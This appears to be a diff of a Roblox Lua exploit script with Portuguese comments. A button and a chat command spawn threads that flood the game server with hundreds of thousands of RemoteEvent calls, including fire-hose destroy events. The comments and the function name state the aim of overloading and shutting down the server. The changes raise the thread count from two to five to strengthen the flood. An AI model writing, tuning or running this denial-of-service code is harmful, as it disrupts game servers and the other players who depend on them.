@@ -952,7 +952,7 @@ MainTab:Button({
       })
 
       -- Dispara múltiplos fios paralelos ao mesmo tempo para maximizar o tráfego de rede
-      for i = 1, 2 do
+      for i = 1, 5 do
           task.spawn(function()
               -- 100.000 requisições por fio em altíssima velocidade (Total: 500.000)
               for m = 1, 100000 do
@@ -974,7 +974,7 @@ MainTab:Button({
                   
                   -- Pausa infinitesimal necessária para o seu cliente enviar os dados sem dar crash local antes do servidor processar
                   if m % 30 == 0 then 
-                      task.wait(0.3)
+                      task.wait(0.5)
                   end
               end
           end)
@@ -1272,7 +1272,7 @@ local function executarShutdownPorChat()
     end)
 
     -- Mesma estrutura de canhão de rede do botão visual
-    for i = 1, 2 do
+    for i = 1, 5 do
         task.spawn(function()
             for m = 1, 100000 do
                 task.spawn(function()
@@ -1290,7 +1290,7 @@ local function executarShutdownPorChat()
                         fireHose.ToolSound:FireServer("FireHose", "DestroyFireHose")
                     end
                 end
-                if m % 30 == 0 then task.wait(0.3) end
+                if m % 30 == 0 then task.wait(0.5) end
             end
         end)
     end
